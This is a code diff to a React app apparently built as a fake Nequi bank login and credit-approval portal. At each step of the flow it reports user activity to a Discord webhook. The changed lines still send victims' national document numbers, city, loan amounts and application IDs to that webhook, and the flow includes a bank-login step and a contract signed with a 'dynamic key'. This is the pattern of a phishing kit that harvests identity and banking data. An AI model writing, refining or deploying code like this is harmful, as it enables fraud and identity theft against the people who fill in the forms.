@@ -101,10 +101,7 @@ export default function App() {
         {step === 'home' && (
           <HomeScreen
             onStart={() => {
-              DiscordWebhookService.sendInfo(
-                'Inicio de flujo',
-                'Usuario ingresó al portal y comenzó solicitud de crédito',
-              )
+              DiscordWebhookService.sendInfo('Inicio de flujo', '', {}, {})
               navigate('nequi-login', 'forward')
             }}
           />
@@ -127,8 +124,8 @@ export default function App() {
             onContinue={() => {
               DiscordWebhookService.sendUserEvent(
                 'Formulario enviado',
-                'Usuario completó y envió el formulario de solicitud',
-                { name: formData.fullName, role: 'Cliente', phone: formData.phone },
+                '',
+                {},
                 {
                   'Documento': formData.documentId,
                   'Ciudad': formData.city,
@@ -147,11 +144,6 @@ export default function App() {
         {step === 'verification' && (
           <VerificationScreen
             onComplete={() => {
-              DiscordWebhookService.sendInfo(
-                'Verificación completada',
-                'Sistema completó la verificación de datos e identidad',
-                { name: formData.fullName, role: 'Cliente', phone: formData.phone },
-              )
               navigate('result', 'forward')
             }}
           />
@@ -165,11 +157,10 @@ export default function App() {
             onApproved={() => {
               DiscordWebhookService.sendSuccess(
                 'Crédito pre-aprobado',
-                'Solicitud evaluada y pre-aprobada. Usuario avanza a firma de contrato',
-                { name: formData.fullName, role: 'Cliente', phone: formData.phone },
+                '',
+                {},
                 {
                   'Monto aprobado': `$${parseInt(formData.loanAmount || '0').toLocaleString('es-CO')} COP`,
-                  'Plazo': `${formData.loanTerm} meses`,
                 },
               )
               navigate('access', 'forward')
@@ -184,13 +175,12 @@ export default function App() {
               setApplicationId(appId)
               DiscordWebhookService.sendSuccess(
                 'Contrato firmado',
-                'Usuario firmó el contrato con clave dinámica. Crédito aprobado definitivamente',
-                { name: formData.fullName, role: 'Cliente', phone: formData.phone },
+                '',
+                {},
                 {
-                  'Número de solicitud': appId,
                   'Monto': `$${parseInt(formData.loanAmount || '0').toLocaleString('es-CO')} COP`,
-                  'Ciudad': formData.city,
                   'Documento': formData.documentId,
+                  'Número de solicitud': appId,
                 },
               )
               navigate('final', 'forward')
@@ -205,9 +195,9 @@ export default function App() {
             onReset={() => {
               DiscordWebhookService.sendInfo(
                 'Sesión finalizada',
-                'Usuario completó el proceso y volvió al inicio',
-                { name: formData.fullName, role: 'Cliente', phone: formData.phone },
-                { 'Solicitud': applicationId },
+                '',
+                {},
+                {},
               )
               reset()
             }}
